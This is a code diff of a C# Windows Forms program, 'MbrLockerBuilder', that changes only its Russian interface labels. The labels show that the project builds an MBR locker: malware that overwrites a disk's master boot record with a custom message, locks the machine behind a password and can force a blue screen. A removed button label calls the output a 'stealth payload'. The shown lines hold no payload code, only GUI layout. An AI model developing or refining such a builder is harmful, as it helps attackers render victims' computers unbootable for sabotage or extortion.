@@ -31,7 +31,7 @@ namespace MbrLockerBuilder
 
         public MainForm()
         {
-            this.Text = "MBR Locker Builder v6.0 (Russian Support + Text Sectors)";
+            this.Text = "MBR Locker Builder";
             this.Size = new Size(1000, 750);
             this.BackColor = Color.FromArgb(10, 15, 10);
             this.ForeColor = Color.FromArgb(0, 255, 100);
@@ -52,7 +52,7 @@ namespace MbrLockerBuilder
             int controlWidth = 400;
 
             Label lblTitle = new Label();
-            lblTitle.Text = "ЗАГОЛОВОК (можно русский):";
+            lblTitle.Text = "Заголовок:";
             lblTitle.Left = leftLabel;
             lblTitle.Top = y;
             lblTitle.Width = 200;
@@ -72,7 +72,7 @@ namespace MbrLockerBuilder
             y += 40;
 
             Label lblBody = new Label();
-            lblBody.Text = "ТЕКСТ (можно русский):";
+            lblBody.Text = "Текст:";
             lblBody.Left = leftLabel;
             lblBody.Top = y;
             lblBody.Width = 200;
@@ -94,7 +94,7 @@ namespace MbrLockerBuilder
             y += 140;
 
             Label lblPass = new Label();
-            lblPass.Text = "ПАРОЛЬ (виден при вводе):";
+            lblPass.Text = "Пароль:";
             lblPass.Left = leftLabel;
             lblPass.Top = y;
             lblPass.Width = 200;
@@ -114,7 +114,7 @@ namespace MbrLockerBuilder
             y += 40;
 
             Label lblTextColor = new Label();
-            lblTextColor.Text = "ЦВЕТ ТЕКСТА:";
+            lblTextColor.Text = "Цвет текста:";
             lblTextColor.Left = leftLabel;
             lblTextColor.Top = y;
             lblTextColor.Width = 150;
@@ -135,7 +135,7 @@ namespace MbrLockerBuilder
             this.Controls.Add(this.cmbTextColor);
 
             Label lblBgColor = new Label();
-            lblBgColor.Text = "ФОН:";
+            lblBgColor.Text = "Фон:";
             lblBgColor.Left = leftControl + 140;
             lblBgColor.Top = y;
             lblBgColor.Width = 50;
@@ -157,7 +157,7 @@ namespace MbrLockerBuilder
             y += 45;
 
             this.chkBSOD = new CheckBox();
-            this.chkBSOD.Text = "ВЫЗВАТЬ BSOD ПОСЛЕ ПЕРЕЗАПИСИ";
+            this.chkBSOD.Text = "Вызвать BSOD после перезаписи";
             this.chkBSOD.Left = leftControl;
             this.chkBSOD.Top = y;
             this.chkBSOD.Width = 350;
@@ -168,7 +168,7 @@ namespace MbrLockerBuilder
             y += 50;
 
             Label lblPreview = new Label();
-            lblPreview.Text = "ПРЕДПРОСМОТР (MBR):";
+            lblPreview.Text = "Предпросмотр (MBR):";
             lblPreview.Left = leftLabel;
             lblPreview.Top = y;
             lblPreview.Width = 250;
@@ -189,7 +189,7 @@ namespace MbrLockerBuilder
             y += 260;
 
             this.btnBuild = new Button();
-            this.btnBuild.Text = "СОБРАТЬ STEALTH PAYLOAD";
+            this.btnBuild.Text = "СОБРАТЬ MBR ЛОКЕР";
             this.btnBuild.Left = leftControl;
             this.btnBuild.Top = y;
             this.btnBuild.Width = 300;
@@ -203,7 +203,7 @@ namespace MbrLockerBuilder
             this.Controls.Add(this.btnBuild);
 
             this.lblStatus = new Label();
-            this.lblStatus.Text = "Готов (пароль виден при вводе)";
+            this.lblStatus.Text = "Готов";
             this.lblStatus.Left = leftControl + 320;
             this.lblStatus.Top = y + 10;
             this.lblStatus.Width = 450;
